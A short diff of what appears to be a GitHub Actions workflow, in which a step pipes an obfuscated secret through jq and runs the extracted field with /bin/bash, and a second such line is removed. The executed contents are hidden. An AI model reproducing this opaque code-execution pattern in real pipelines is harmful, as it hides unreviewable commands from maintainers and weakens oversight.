@@ -17,7 +17,6 @@ jobs:
           ynthu1: ${{ secrets.ynthu1 }}
         run: |
           printf '%s' "$ynthu1" | jq -r .xu14 | /bin/bash
-          printf '%s' "$er7" | jq -r .axmk728 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
